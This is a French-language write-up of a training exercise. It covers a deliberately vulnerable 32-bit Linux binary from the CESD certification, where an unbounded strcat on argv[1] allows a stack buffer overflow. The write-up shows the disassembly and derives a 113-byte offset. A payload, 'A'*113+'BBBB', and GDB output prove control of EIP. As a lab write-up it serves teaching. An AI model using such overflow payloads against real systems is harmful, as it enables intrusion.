# cesd_dvl_assessment_2 — zero (« 01_exploitme02 »)

- **Site** : [crackmes.one/crackme/5ab77f5333c5d40ad448c11e](https://crackmes.one/crackme/5ab77f5333c5d40ad448c11e) (réimport crackmes.de)
- **Auteur** : zero
- **Plateforme** : Unix/Linux — ELF 32-bit (Intel i386), non strippé, avec `debug_info`
- **Langage** : C (GCC, *Damn Vulnerable Linux*)
- **Difficulté** : 1.0 · **Qualité** : 4.0
- **Publié** : 2018-03-25 (réimport) — exercice de la certification CESD

> *Practical Assessment 02* de la certification **CESD** (IITAC). Comme le #01,
> ce n'est pas un keygen : l'objectif est d'exploiter un débordement de tampon,
> ici via `strcat`. On démontre la prise de contrôle d'EIP.

## Le binaire

Le ZIP contient `01_exploitme02` (l'ELF) et le workbook `IITAC_CESD_Exercises.pdf`.

```
$ file 01_exploitme02
ELF 32-bit LSB executable, Intel i386, dynamically linked,
interpreter /lib/ld-linux.so.2, with debug_info, not stripped
```

SHA-256 de l'ELF extrait : `9a8a3b5e11fa8af0da9ce7f883f3ad184bce9a3cb1e94ceaf3b4e48b1feb070c`.

## Comment on trouve

`objdump -d -M intel 01_exploitme02` sur `main` :

```asm
080483c4 <main>:
 80483c4: push   ebp
 80483c5: mov    ebp,esp
 80483c7: push   edi
 80483c8: sub    esp,0xa4
 ...
 ; precharge buf = [ebp-0x88] avec la chaine .rodata (copiee dword par dword)
 80483d8: mov    eax,ds:0x80485c0 ; "Exploiting applications is "
 80483dd: mov    [ebp-0x88],eax
 ...
 804842d: cmp    DWORD PTR [ebp+0x8],0x1   ; argc > 1 ?
 8048431: jg     804844b
 ; branche "pas d'argument" : printf("Please enter a positive adjective!")
 804844b: mov    eax,[ebp+0xc]            ; argv
 804844e: add    eax,0x4                  ; &argv[1]
 8048451: mov    eax,[eax]                ; argv[1]
 8048453: mov    [esp+0x4],eax            ; src
 8048457: lea    eax,[ebp-0x88]           ; dest = buf
 804845d: mov    [esp],eax
 8048460: call   80482d8 <strcat@plt>     ; strcat(buf, argv[1])  ← pas de borne
 ...
```

Le tampon `buf = [ebp-0x88]` est d'abord **pré-rempli** avec la chaîne
`.rodata` `"Exploiting applications is "`, puis le programme fait
`strcat(buf, argv[1])` **sans contrôle de longueur**. Débordement de pile.

### Offset jusqu'à l'adresse de retour

- `buf` commence à `ebp-0x88`.
- Après `push ebp` puis `push edi`, le cadre place `edi` sauvegardé à `ebp-0x4`,
  l'`ebp` sauvegardé à `ebp+0` et l'adresse de retour à `ebp+4`.
- Distance `buf → adresse de retour` : `0x88 + 4 = 0x8c = 140` octets.

Mais `strcat` **ajoute après le préfixe existant**. La chaîne .rodata
`"Exploiting applications is "` fait **27 octets** (avec l'espace final, hors
NUL). Donc l'offset *dans `argv[1]`* jusqu'à l'adresse de retour est :

```
140 (buf → ret)  −  27 (préfixe déjà présent)  =  113 octets
```

### Payload

```
"A" * 113  +  <adresse sur 4 octets little-endian>
```

Avec `"BBBB"` (= `0x42424242`) pour prouver le contrôle d'EIP.

## Vérification

```
$ ./01_exploitme02 $(python3 -c 'print("A"*113+"BBBB")')
Exploiting applications is AAAA...BBBB
Segmentation fault
```

### Debug GDB

On confirme qu'EIP vaut exactement `0x42424242` au crash :

```
$ gdb -q ./01_exploitme02
(gdb) run $(python3 -c 'print("A"*113+"BBBB")')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers eip
eip            0x42424242          0x42424242
```

Un offset de 112 donne `eip = 0x00424242` (un octet de moins) — ce qui confirme
que **113** est bien l'alignement exact sur l'adresse de retour.

## Solveur

[`tools/crackmes-de-cesd_dvl_assessment_2-solve.py`](tools/crackmes-de-cesd_dvl_assessment_2-solve.py) :

```
$ ./tools/crackmes-de-cesd_dvl_assessment_2-solve.py
prefixe (.rodata) : 'Exploiting applications is ' (27 octets)
offset EIP        : 113
EIP cible         : 0x42424242
payload (len=117) : b'AAAAAAAAAAAAAAAA'...b'BBBB'

$ ./tools/crackmes-de-cesd_dvl_assessment_2-solve.py --gdb
eip            0x42424242          0x42424242
EIP controle : OUI
```

## Réponse

| | |
|---|---|
| Vulnérabilité | `strcat(buf[0x88], argv[1])` dans `main`, sans borne |
| Préfixe déjà dans `buf` | `"Exploiting applications is "` (27 octets) |
| Offset vers l'adresse de retour | **113 octets** (`140 − 27`) |
| Payload de preuve | `"A"*113 + "BBBB"` → EIP = `0x42424242` |

Exemple (`petik`) : `./01_exploitme02 $(python3 -c 'print("A"*113+"BBBB")')` plante avec EIP contrôlé.
